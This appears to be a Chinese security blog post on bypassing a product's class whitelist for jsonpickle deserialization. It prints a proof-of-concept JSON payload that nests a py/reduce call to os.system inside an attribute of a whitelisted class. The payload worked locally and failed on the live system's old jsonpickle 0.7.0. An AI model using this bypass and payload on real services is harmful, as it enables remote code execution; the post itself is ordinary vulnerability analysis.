---
title: 一次失败的jsonpickle反序列化漏洞利用
date: 2022-01-18 16:56:07
tags:
  - Python
  - 反序列化
  - pickle
categories: 漏洞分析
---

一次失败的jsonpickle反序列化漏洞利用，记录一下。
<!-- more -->

# 0x00 产品的白名单校验逻辑

最近测试一个产品，发现产品在解析http请求中的message时，使用了jsonpickle库。大致的代码如下：

```python
def json_decode(string):
    json_validate(string)
    return jsonpickle.decode(string)
```

```python
JSON_PICKLE_WHITE_LIST = [
    "xx.yy.A",
    "xx.yy.B"
]


def json_validate(raw_string):
    """jsonpickle.decode数据做白名单校验"""
    raw_data = json.loads(raw_string)
    if not raw_data:
        return
    if isinstance(raw_data, list):
        for item in raw_data:
            class_name = item.get("py/object")
            if class_name not in JSON_PICKLE_WHITE_LIST:
                raise ValueError("%s is invalid for jsonpickle" % class_name)
    elif isinstance(raw_data, dict):
        class_name = raw_data.get("py/object")
        if class_name not in JSON_PICKLE_WHITE_LIST:
            raise ValueError("%s is invalid for jsonpickle" % class_name)
    else:
        raise ValueError("%s is invalid type for jsonpickle" % type(raw_data))
```

可以看到在使用jsonpickle解析前，有一个白名单校验逻辑，校验需要创建的对象是否在白名单内。

第一眼看到，就觉得有问题。校验时识别到"py/object"这个tag，会校验值是否为白名单里的类。如果触发反序列化漏洞的点为白名单类的一个属性呢？好像就可以直接绕过白名单校验逻辑。

# 0x01 本地尝试绕过

首先在本地尝试绕过，将产品的json解析代码在本地实现了。

- Step 1：构造Exp类

跟pickle反序列化的利用思路一样，利用的是\_\_reduce\_\_这个魔法函数，Exp类如下：

```python
class Exp:

    def __reduce__(self):
        return os.system, ("calc",)
```

- Step 2：然后创建白名单类（A）的对象，并将Exp对象赋值给A的成员变量d：

```python
a = A("test")
a.d = Exp()
print(jsonpickle.encode(a))
```

编码后结果如下：

```json
{"py/object": "xx.yy.A", "u": null, "l": {}, "d": {"py/reduce": [{"py/function": "nt.system"}, {"py/tuple": ["calc"]}]}}
```

- Step 3：使用该Poc进行解析操作

```python
poc = '{"py/object": "xx.yy.A", "u": null, "l": {}, "d": {"py/reduce": [{"py/function": "nt.system"}, {"py/tuple": ["calc"]}]}}'
json_decode(poc)
```

成功弹出计算器

# 0x02 现网利用

于是拿着修改后的payload兴冲冲地去现网进行验证，发现在现网尝试利用后毫无反应。WTF！

对产品的代码进行了进一步调试，终于发现了原因。原来产品用的是jsonpickle老版本0.7.0。在这个版本里，还没有支持"py/reduce"这个tag，导致无法触发函数的执行。

在0.7.0这个版本里，仅支持以下的tag：

```python
# jsonpickle 0.7.0
# file path: tags.py
from jsonpickle.compat import set

ID = 'py/id'
OBJECT = 'py/object'
TYPE = 'py/type'
REPR = 'py/repr'
REF = 'py/ref'
TUPLE = 'py/tuple'
SET = 'py/set'
SEQ = 'py/seq'
STATE = 'py/state'
JSON_KEY = 'json://'

# All reserved tag names
RESERVED = set([OBJECT, TYPE, REPR, REF, TUPLE, SET, SEQ, STATE])
```

```python
# jsonpickle 0.7.0
# file path: unpickler.py
class Unpickler(object):
    
    ...
    
    def _restore(self, obj):
        if has_tag(obj, tags.ID):
            restore = self._restore_id
        elif has_tag(obj, tags.REF): # Backwards compatibility
            restore = self._restore_ref
        elif has_tag(obj, tags.TYPE):
            restore = self._restore_type
        elif has_tag(obj, tags.REPR): # Backwards compatibility
            restore = self._restore_repr
        elif has_tag(obj, tags.OBJECT):
            restore = self._restore_object
        elif util.is_list(obj):
            restore = self._restore_list
        elif has_tag(obj, tags.TUPLE):
            restore = self._restore_tuple
        elif has_tag(obj, tags.SET):
            restore = self._restore_set
        elif util.is_dictionary(obj):
            restore = self._restore_dict
        else:
            restore = lambda x: x
        return restore(obj)
```

# 0x03 感想

搞了一个下午，白白兴奋了一下。第一次发现开源软件不升级版本，有的时候竟然还是一件好事情。。。

从代码来看，当前可以通过"py/object"去创建一个对象，可以通过"py/type"去加载一个模块。后续看看产品对反序列化结果是如何使用的，因为对象的属性是可以控制的，如果使用不当（例如拼接到命令里），还是可以进一步利用的。
